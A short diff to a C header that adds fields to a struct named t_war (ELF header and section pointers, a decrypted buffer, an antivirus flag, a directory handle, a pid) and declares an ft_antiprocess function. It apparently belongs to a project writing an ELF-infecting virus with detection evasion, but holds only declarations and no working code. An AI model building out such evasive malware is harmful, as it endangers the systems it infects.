@@ -20,10 +20,24 @@
 
 typedef struct s_war
 {
-
+    int             fd;
+    int             file_size;
+    int             antivirus;
+    char            *strtab;
+    char            *decrypted;
+    const char      *binary;
+    unsigned char   *elf;
+    void            *signd;
+    Elf64_Ehdr      *header;
+    Elf64_Shdr      *sectab;
+    struct stat     file_info;
+    DIR             *dir;
+    pid_t           pid;
 }   t_war;
 
 /*  FUNCTIONS   */
 
+//int     main(void);
+void    ft_antiprocess(t_war *war);
 
 #endif
